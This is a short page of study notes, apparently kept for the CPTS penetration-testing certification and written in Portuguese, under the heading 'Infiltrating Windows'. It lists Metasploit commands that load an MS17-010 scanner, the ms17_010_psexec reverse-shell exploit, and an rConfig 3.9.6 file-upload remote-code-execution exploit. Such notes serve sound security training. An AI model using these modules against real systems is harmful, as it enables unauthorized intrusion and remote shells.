> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/shells-and-payloads/infiltrating-windows.md).

# Infiltrating Windows

* Módulo de exploração Metasploit usado para verificar se um host é vulnerável a`ms17_010`

```sh
use auxiliary/scanner/smb/smb_ms17_010
```

* Módulo de exploração Metasploit usado para obter uma sessão de shell reverso em um sistema baseado em Windows que é vulnerável ao ms17\_010

```sh
use exploit/windows/smb/ms17_010_psexec	
```

* Módulo de exploração Metasploit que pode ser usado para obter um shell reverso em um sistema Linux vulnerável hospedado`rConfig 3.9.6`

```sh
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```
